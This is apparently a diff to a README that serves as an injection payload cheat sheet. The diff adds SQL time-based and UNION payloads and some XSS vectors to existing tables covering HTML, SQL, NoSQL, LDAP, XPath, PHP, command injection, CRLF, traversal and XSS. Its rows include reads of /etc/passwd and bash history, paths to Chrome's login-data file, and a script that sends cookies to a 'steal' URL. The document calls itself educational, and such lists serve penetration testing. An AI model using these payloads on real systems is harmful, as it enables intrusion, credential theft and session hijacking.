@@ -1,4 +1,4 @@
-Injections Attack example by: ![pxcs](https://github.com/pxcs/)
+Injections Attack example by: [pxcs](https://github.com/pxcs/)
 
 <a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/"><img src="https://png.pngtree.com/png-vector/20231205/ourmid/pngtree-artificial-intelligence-bionic-human-robot-png-image_10814416.png" align="right" width="100" alt="robot"></a>
 
@@ -7,7 +7,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 
 ### List of query injection: 
 
-| HTML Injections |
+| 💉 HTML Injections |
 | ---- |
 | ```</title></head><body><img src=http://myImage.png>``` |
 | ```<META HTTP-EQUIV="refresh" CONTENT="1;url=http://www.test.com">``` |
@@ -25,7 +25,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```<video width="320" height="240" controls></video>``` |
 | ```<h1>html</h1>``` |
 
-| HTML Injection Read File |
+| 💉 HTML Injection Read File |
 | ---- |
 | ```/home/$USER/.bash_history``` |
 | ```%2Fetc%2Fpasswd%2500``` |
@@ -44,7 +44,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```../../../../../../proc/net/arp``` |
 <br>
 
-| SQL Injections |
+| 💉 SQL Injections |
 | ---- |
 | ```0' or '0' = '0``` |
 | ```1' or '1' = '1``` |
@@ -62,9 +62,22 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```' or 1=1 LIMIT 1;#``` |
 | ```') or ('a'='a and hi") or ("a"="a``` |
 | ```123 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055``` |
-<br>
+| ```ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))``` |
+| ```ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6``` |
+| ```ORDER BY 1,SLEEP(5),3,4#``` |
+| ```UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14``` |
+| ```UNION ALL SELECT @@VERSION,USER(),SLEEP(5)--``` |
+| ```AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#``` |
+| ```AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))``` |
+| ```UNION ALL SELECT 'INJ''ECT''XXX',2,3,4``` |
+| ```UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#``` |
+| ```admin') or '1'='1'/*``` |
+| ```admin') or ('1'='1'--``` |
+| ```benchmark(50000000,MD5(1))--``` |
+| ```or benchmark(50000000,MD5(1))--``` |
+| ```")) or sleep(5)="``` |
 
-| PHP Injections |
+| 💉 PHP Injections |
 | ---- |
 | ```&&id``` |
 | ```;system('id')``` |
@@ -88,7 +101,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```ECHO%20FILE_PUT_CONTENTS("index.html","HELLO%20WORLD.%20TESTING!");``` |
 <br>
 
-| NoSQL Injections |
+| 💉 NoSQL Injections |
 | ---- |
 | ```username[$ne]=toto&password[$ne]=toto``` |
 | ```login[$gt]=admin&login[$lt]=test&pass[$ne]=1``` |
@@ -102,7 +115,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```";return 'a'=='a' && ''=='``` |
 <br>
 
-| LDAP Injections |
+| 💉 LDAP Injections |
 | ---- |
 | ```(uid=*)(userPassword=*)``` |
 | ```(uid=admin)((uid=*)(userPassword=*))``` |
@@ -123,7 +136,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```*)(&``` |
 <br>
 
-| XPath Injections |
+| 💉 XPath Injections |
 | ---- |
 | ```' or true() or '``` |
 | ```' or '1'='1``` |
@@ -139,7 +152,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```//user[username/text()='username' and password/text()='' or '1'='1']``` |
 <br>
 
-| Command Injection Unix |
+| 💉 Command Injection Unix |
 | ---- |
 | ```&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;``` |
 | ```&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;``` |
@@ -154,7 +167,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```ca$@t /etc/passwd``` |
 | ```cat $(xxd -r -ps <(echo 2f6574632f706173737764))``` |
 
-| Command Injection Windows |
+| 💉 Command Injection Windows |
 | ---- |
 | ```C:\Users\{username}\AppData\Local\FileZilla``` |
 | ```C:\Users\{username}\AppData\Local\Google\Chrome\User Data\Default\Login Data``` |
@@ -164,7 +177,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```C:\Windows\System32\LogFiles\W3SVC1``` |
 <br>
 
-| XPath Injections |
+| 💉 XPath Injections |
 | ---- |
 | ```' or name()='username' or '``` |
 | ```' or 1=1 or '1'='1``` |
@@ -172,7 +185,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```//user[username/text()='username' and password/text()='' or '1'='1']``` |
 <br>
 
-| Java Script Injections |
+| 💉 Java Script Injections |
 | ---- |
 | ```<script>alert('Injected!');</script>``` |
 | ```<script>document.location='http.com/steal?cookie=' + .cookie;</script>``` |
@@ -185,7 +198,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```http://example.com?username=<script>alert('Injected!');</script>``` |
 <br>
 
-| JSON Injections |
+| 💉 JSON Injections |
 | ---- |
 | ```{ "username": "admin", "password": { "$ne": null } }``` |
 | ```{ "username": "user", "password": "password", "admin": true }``` |
@@ -198,7 +211,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```{"username": "admin","password": "' OR '1'='1"}``` |
 <br>
 
-| XML Injections |
+| 💉 XML Injections |
 | ---- |
 | ```<user><name>admin</name><password>' or '1'='1</password></user>``` |
 | ```<user><name>admin</name><password><admin>true</admin></password></user>``` |
@@ -207,7 +220,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```<user role='admin'><name>user</name><password>password</password></user>``` |
 <br>
 
-| Directory Traversal Injections |
+| 💉 Directory Traversal Injections |
 | ---- |
 | ```/admin/(S(X))/main.aspx``` |
 | ```/admin/Foobar/(S(X))/../(S(X))/main.aspx``` |
@@ -220,7 +233,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```%uff0e%uff0e%u2216``` |
 <br>
 
-| CRLF Injections |
+| 💉 CRLF Injections |
 | ---- |
 | ```/%%0a0aSet-Cookie:crlf=injection``` |
 | ```/%0aSet-Cookie:crlf=injection``` |
@@ -240,7 +253,7 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```/%u000aSet-Cookie:crlf=injection``` |
 <br>
 
-| XSS Attacks |
+| 💉 XSS Attacks |
 | ---- |
 | ```"-prompt(8)-"``` |
 | ```'-eval("window['pro'%2B'mpt'](8)")-'``` |
@@ -283,6 +296,9 @@ Injections Attack example by: ![pxcs](https://github.com/pxcs/)
 | ```<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>``` |
 | ```<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>``` |
 | ```<script src="data:\xD4\x8F,javascript:alert(1)"></script>``` |
+| ```<iframe src=http://xss.rocks/scriptlet.html <``` |
+| ```<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>``` |
+| ```<IMG SRC="javascript:alert('XSS');">``` |
 <hr>
 
-I know there is a lot more types, languages and attack out there, here are just a simple list and example, I will update it soon. Big thanks to the ![internet](https://www.youtube.com/watch?v=wcaiKgQU6VE&pp=ygUQcXVlcnkgaW5qZWN0aW9ucw%3D%3D) for the references. ***Note***, this module and list was just for an educational purposes only.
+I know there is a lot more types, languages and attack method out there, here are just a simple list and example, I will update it soon. Big thanks to the [internet](https://www.youtube.com/watch?v=wcaiKgQU6VE&pp=ygUQcXVlcnkgaW5qZWN0aW9ucw%3D%3D) for the references. ***Note***, this module and list was just for an educational purposes only.
